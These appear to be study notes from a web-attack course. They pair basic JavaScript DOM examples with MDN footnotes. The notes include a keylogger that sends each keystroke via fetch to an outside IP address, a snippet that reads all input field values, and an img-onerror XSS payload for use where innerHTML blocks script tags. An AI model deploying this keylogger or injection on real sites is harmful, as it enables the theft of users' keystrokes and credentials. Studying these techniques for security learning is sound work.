#### Javascript method

=====
function processData(data) {
    data.items.forEach(item => {
      console.log(item)
    });
  }

let foo = {
    items: [
      "Hello",
      "Zdravo",
      "Hola"
    ]
  }

processData(foo)
=====

(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window ↩︎

4
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document ↩︎

type "allow pasting" in firefox web console.

====
let inputs = document.getElementsByTagName("input") 

for (let input of inputs){
    console.log(input.value)
}

====

#### key logging

====
function logKey(event){
	console.log(event.key);
	fetch("http://192.168.49.51/k?key=" + event.key);
}

document.addEventListener('keydown', logKey);
====

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window/location ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document ↩︎

4
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/Events ↩︎

5
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch ↩︎

6
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise ↩︎

7
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event ↩︎

In case of innerHTML script tag does not get executed. use img tag.
<img src=x onerror=alert(0)>

https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML ↩︎

